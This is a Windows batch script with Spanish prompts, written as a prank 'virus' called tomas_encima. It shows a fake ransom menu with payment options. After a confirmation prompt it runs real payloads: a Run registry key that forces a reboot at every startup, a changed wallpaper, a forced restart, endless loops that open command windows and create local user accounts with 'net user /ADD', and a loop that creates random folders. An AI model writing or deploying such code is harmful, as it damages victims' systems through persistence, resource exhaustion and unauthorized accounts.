@ECHO OFF


goto MALWARE

:INICIO

echo x=msgbox ("Has sido infectado por tomas_encima.exe", 0+16, "tomas_encima.exe") >a.vbs
echo x=msgbox (":D", 0+16, "Virus") >> a.vbs & a.vbs & del a.vbs

color 0F
goto menu

:COLOR
CLS
SET /P A="Selecciona un color. Puede ser Negro, Azul, Verde, Aqua, Rojo, Morado y Amarillo. Si quieres algo interesante pon ???: "
IF %A%==Negro color 0F
IF %A%==negro color 0F
IF %A%==Azul color 1F
IF %A%==azul color 1F
IF %A%==Verde color 2F
IF %A%==verde color 2F
IF %A%==Aqua color 3F
IF %A%==aqua color 3F
IF %A%==Rojo color 4F
IF %A%==rojo color 4F
IF %A%==Morado color 5F
IF %A%==morado color 5F
IF %A%==Amarillo color 6F
IF %A%==amarillo color 6F
IF %A%==??? goto MULTI
goto MENU

:TEXTODECOLORES

CLS
ECHO Selecciona un color general. Puede ser Gris, Azul, Verde, Aqua, Rojo, Morado, Amarillo o Blanco:
SET /P B=""
IF %B%==Gris color 08
IF %B%==gris color 08
IF %B%==Azul color 19
IF %B%==azul color 19
IF %B%==Verde color 2A
IF %B%==verde color 2A
IF %B%==Aqua color 3B
IF %B%==aqua color 3B
IF %B%==Rojo color 4C
IF %B%==rojo color 4C
IF %B%==Morado color 5D
IF %B%==morado color 5D
IF %B%==Amarillo color 6E
IF %B%==amarillo color 6E
IF %B%==Blanco color 6F
IF %B%==blanco color 6F


:MENU
REM MENU PRINCIPAL


CLS
ECHO.
ECHO ..............................................................................
ECHO  _                                             _                                
ECHO ^| ^|                                           (_)                               
ECHO ^| ^|_ ___  _ __ ___   __ _ ___   ___ _ __   ___ _ _ __ ___   __ _   _____  _____ 
ECHO ^| __/ _ ^\^| '_ ` _ ^\ / _` / __^| / _ ^\ '_ ^\ / __^| ^| '_ ` _ ^\ / _` ^| / _ ^\ ^\/ / _ ^\
ECHO ^| ^|^| (_) ^| ^| ^| ^| ^| ^| (_^| ^\__ ^\^|  __/ ^| ^| ^| (__^| ^| ^| ^| ^| ^| ^| (_^| ^|^|  __/^>  ^<  __/
ECHO  ^\__^\___/^|_^| ^|_^| ^|_^|^\__,_^|___/ ^\___^|_^| ^|_^|^\___^|_^|_^| ^|_^| ^|_^|^\__,_(_)___/_/^\_^___^|
ECHO                            ______                                               
ECHO                           ^|______^|                                              
ECHO.
ECHO   Has sido infectado por tomas_encima.exe.
ECHO   He infectado tu sistema y me tendras que pagar para recuperarlo.
ECHO   Buena suerte. Muajajajjajajajajajajjaajaaa  
ECHO.                       
ECHO ------------------------------------------------------------------------------
ECHO   PELIGRO! No pagar podria causar la explosion de tu ordenador.
ECHO ..............................................................................
ECHO.
ECHO   1 - Pagar con Paypal
ECHO   2 - Pagar en efectivo
ECHO   3 - Pagar con tarjeta
ECHO   4 - Pagare despues
ECHO   5 - Infectar
ECHO   6 - Quiero mis archivos 
ECHO   D - Desinstalar
ECHO   A - Ajustes
ECHO   E - Salir
ECHO.

rem Menú principal
SET /P C=" Selecciona una opcion y pulsa ENTER: "
IF %C%==1 GOTO PAYPAL
IF %C%==2 GOTO EFECTIVO
IF %C%==3 GOTO TARJETA
IF %C%==4 GOTO PAGARDESPUES
IF %C%==5 GOTO INFECTAR

IF %C%==6 GOTO RECUPERAR
IF %C%==D GOTO DESINSTALAR
IF %C%==d GOTO DESINSTALAR
IF %C%==E GOTO INFECTAR
IF %C%==e GOTO INFECTAR
IF %C%==A GOTO CONFIG
IF %C%==a GOTO CONFIG
IF %C%==TomyEsGuapo GOTO MULTI
IF %C%==EsteVirusEsPeligroso GOTO X
IF %C%==Carpetaz GOTO XYZ
GOTO MENU

rem Etiquetas
:CONFIG
CLS
ECHO           _           _            
ECHO     /\   (_)         ^| ^|           
ECHO    /  \   _ _   _ ___^| ^|_ ___  ___ 
ECHO   / /\ \ ^| ^| ^| ^| / __^| __/ _ \/ __^|
ECHO  / ____ \^| ^| ^|_^| \__ \ ^|^|  __/\__ \
ECHO /_/    \_\ ^|\__,_^|___/\__\___^|^|___/
ECHO         _/ ^|                       
ECHO         ^|__/
ECHO.
ECHO.
ECHO C - Cambiar color de fondo
ECHO T - Cambiar color general
ECHO P - Probar Payload
ECHO V - Volver
ECHO.
SET /P D=" Selecciona un ajuste y pulsa ENTER: "
IF %D%==C GOTO COLOR
IF %D%==c GOTO COLOR
IF %D%==T GOTO TEXTODECOLORES
IF %D%==t GOTO TEXTODECOLORES
IF %D%==V GOTO MENU
IF %D%==v GOTO MENU
IF %D%==P GOTO PAYLOAD
IF %D%==p GOTO PAYLOAD
goto CONFIG


:PAYPAL
CLS
ECHO. 
SET /P E=" Introduce tu cuenta de Paypal y pulsa ENTER: "
color 2F
TIMEOUT 5 /NOBREAK >nul
ECHO Gracias por pagar, %E%
ECHO Espera, %E%
ECHO La clave!
SET /P C=" Introduce la clave: "
ECHO CLAVE INCORRECTA!
color 0C
TIMEOUT 5 /NOBREAK >nul
GOTO INFECTANDO


:EFECTIVO
CLS
color 2F
ECHO Para pagar, ve a la calle federico 123 o a la calle tomasplaza º123
TIMEOUT 5 /NOBREAK >nul
color 0C
ECHO Te infectare mientras vienes...
GOTO INFECTANDO


:TARJETA
CLS
color 2F

SET /P F=" Introduce el metodo de pago. Mastercard, Visa, BBVA, Caixabank y Lacaixa: "
IF %F%==Mastercard ECHO Me aburro asi que te infecto igual.
IF %F%==Visa ECHO Me aburro asi que te infecto igual.
IF %F%==BBVA ECHO Me aburro asi que te infecto igual.
IF %F%==Caixabank ECHO Me aburro asi que te infecto igual.
IF %F%==Lacaixa ECHO Me aburro asi que te infecto igual.

color 0C
TIMEOUT 5 /NOBREAK >nul
GOTO INFECTANDO


:PAGARDESPUES
CLS
ECHO Aqui solo aceptamos el pago aqui y ahora.
color 3F
TIMEOUT 5 /NOBREAK >nul
GOTO MENU


:INFECTAR
CLS
color 0C
ECHO Estas a punto de infectar tu ordenador.

SET /P G="Estas seguro de que quieres hacerlo? Si no sabes como neutralizarlo, pulsa n. (s/n): "
IF %G%==s GOTO s
IF %G%==n GOTO n
GOTO INFECTAR


:s
CLS
color 0C
GOTO INFECTANDO


:n
CLS
color 3F
ECHO Te has salvado de una buena
GOTO DESINFECTANDO


:RECUPERAR
CLS
color 2F
ECHO Vale... Te los dare.
TIMEOUT 5 /NOBREAK > nul
GOTO DESINFECTANDO


:DESINSTALAR
CLS
color 0C
ECHO Oh tio. Soy un virus. acaso crees que me voy a desinstalar de forma tan facil...
TIMEOUT 5 /NOBREAK >nul
color 0A
ECHO ... pues si. Me has caido bien
GOTO DESINFECTANDO


:DESINFECTANDO
REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v tomas_encima /f  2>nul
TIMEOUT 5 /NOBREAK >nul
TASKKILL /f /im cmd.exe 2>nul
GOTO FIN


:INFECTANDO

REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "tomas_encima" /t REG_SZ /F /D "cmd /c \"shutdown /r /t 50 /c \"Has sido infectado >:)\"\"" 2>nul
Reg Add "HKCU\Control Panel\Desktop" /v Wallpaper /f /t REG_SZ /d   C:\tomas_encima\Funcionamiento\download.png
shutdown /r /t 60 /c "Has sido infectado >:) Tienes un minuto."
start "C:\tomas_encima\Funcionamiento\Winlauncher.cmd"
start "C:\tomas_encima\Funcionamiento\Carpetaz.bat"
start "C:\tomas_encima\Funcionamiento\Matrix.bat"
GOTO LOOP


:LOOP
start
start
start
net user Infected%RANDOM% infectado /ADD
start
net user Infected%RANDOM% infectado /ADD
start
echo x=msgbox (":D", 1+16, "Virus") >> a.vbs & start a.vbs & del a.vbs
ECHO I N F E C T A D O 
net user INFECTADO infectado /ADD
GOTO LOOP


:MULTI
color 1F
TIMEOUT 1 /NOBREAK >nul
color 2F
TIMEOUT 1 /NOBREAK >nul
color 3F
TIMEOUT 1 /NOBREAK >nul
color 4F
TIMEOUT 1 /NOBREAK >nul
color 5F
TIMEOUT 1 /NOBREAK >nul
color 6F
TIMEOUT 1 /NOBREAK >nul
color 7F
TIMEOUT 1 /NOBREAK >nul
color 1F
TIMEOUT 1 /NOBREAK >nul
color 2F
TIMEOUT 1 /NOBREAK >nul
CLS
ECHO :)
ECHO GRaziaz
goto MULTI


:PAYLOAD
ECHO Que payload deseas probar?
ECHO El de los CMD, el de las ventanas, el que te reinicia el equipo o el de la clave de registro?
SET /P H=" "
IF %H%==CMD GOTO LOOP
IF %H%==cmd GOTO LOOP
IF %H%==Ventanas GOTO LOOP
IF %H%==ventanas GOTO LOOP
IF %H%==Reinicio shutdown /r /t 60 /c "Has sido infectado >:) Tienes un minuto."
IF %H%==reinicio shutdown /r /t 60 /c "Has sido infectado >:) Tienes un minuto."
IF %H%==Clave REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "tomas_encima" /t REG_SZ /F /D "cmd /c \"shutdown /r /t 50 /c \"Has sido infectado >:)\"\"" 2>nul
IF %H%==clave REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "tomas_encima" /t REG_SZ /F /D "cmd /c \"shutdown /r /t 50 /c \"Has sido infectado >:)\"\"" 2>nul
goto PAYLOAD


REM EASTEREGGS

:X
CLS
color 0A
ECHO Hackeando el sistema...
TIMEOUT 5 /NOBREAK >nul
goto XY

:XY

ECHO  %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% %RANDOM% 
goto XY

:XYZ

MD %RANDOM%
MD %RANDOM%
MD %RANDOM%
MD %RANDOM%
MD %RANDOM%
MD %RANDOM%
MD %RANDOM%
goto XYZ

:MALWARE
color 0C
SET /P I="El virus que estas a punto de ejecutar es considerado malware. Seguro que quieres ejecutarlo? s/n: "
IF %I%==s goto INICIO
IF %I%==S goto INICIO
IF %I%==n taskkill /f /im cmd.exe
IF %I%==N taskkill /f /im cmd.exe
goto MALWARE

:FIN

